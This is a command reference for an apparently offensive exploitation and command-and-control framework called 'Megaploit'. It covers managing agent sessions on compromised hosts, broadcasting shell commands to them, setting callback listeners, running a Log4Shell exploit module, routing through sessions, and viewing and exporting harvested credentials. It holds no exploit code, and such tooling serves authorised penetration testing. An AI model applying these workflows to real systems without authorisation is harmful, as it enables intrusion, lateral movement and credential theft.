# Global Commands

Global commands are typed at the `megaploit [N] »` prompt before entering a session.

## Session Management

| Command | Example | Description |
|---|---|---|
| `sessions` | `sessions` | List all active sessions |
| `sessions -K` | `sessions -K` | Kill all sessions |
| `sessions -k <id>` | `sessions -k 2` | Kill one session by ID |
| `sessions -u <id>` | `sessions -u 1` | Upgrade session |
| `sessions -c <cmd>` | `sessions -c whoami` | Run command on all sessions |
| `sessions -s <tag>` | `sessions -s dc` | Filter by tag |
| `use <id>` | `use 1` | Enter session console |
| `broadcast <cmd>` | `broadcast id` | Run raw shell command on all sessions |

## Server Configuration

| Command | Example | Description |
|---|---|---|
| `set lhost <ip>` | `set lhost 10.0.0.1` | Set agent callback IP |
| `set port <port>` | `set port 4444` | Set agent callback port |
| `set cert <file>` | `set cert cert.pem` | Set TLS certificate |
| `set key <file>` | `set key key.pem` | Set TLS key |
| `set auto_update on` | `set auto_update on` | Enable tool auto-updates |

## TLS

```
megaploit [0] » tls auto           # Generate self-signed cert
megaploit [0] » tls status         # Show fingerprint
megaploit [0] » tls regen          # Rotate cert
```

## Module System

```
megaploit [0] » show modules
megaploit [0] » show modules exploit
megaploit [0] » use exploits/linux/http/log4shell_cve2021_44228
megaploit [0] » setopt RHOSTS 10.0.0.50
megaploit [0] » setopt LHOST 192.168.1.10
megaploit [0] » options
megaploit [0] » check
megaploit [0] » run
megaploit [0] » info
megaploit [0] » back
```

## Listeners

```
megaploit [0] » listener add 4445
megaploit [0] » listener add 8443 --tls
megaploit [0] » listener add 8080 --http
megaploit [0] » listener list
```

## Routing

```
megaploit [0] » route add 10.10.0.0/16 2
megaploit [0] » route print
megaploit [0] » route remove 10.10.0.0/16
megaploit [0] » route flush
```

## Other Commands

| Command | Description |
|---|---|
| `help` | Show all global commands |
| `clear` | Clear terminal |
| `whats new` | Show changelog |
| `history` | Last 20 commands |
| `history search <q>` | Search history |
| `alias <name> <cmd>` | Create alias |
| `unalias <name>` | Remove alias |
| `aliases` | List aliases |
| `engagement name <n>` | Name current engagement |
| `engagement show` | Show engagement info |
| `loot browse` | Browse collected files |
| `jobs list` | List background jobs |
| `jobs kill <id>` | Stop a job |
| `creds show` | Show credential store |
| `creds search admin` | Search credentials |
| `creds export creds.json` | Export credentials |
| `web start` | Start web dashboard |
| `web stop` | Stop web dashboard |
| `rpc start` | Start JSON-RPC server |
| `exit` | Shut down Megaploit |
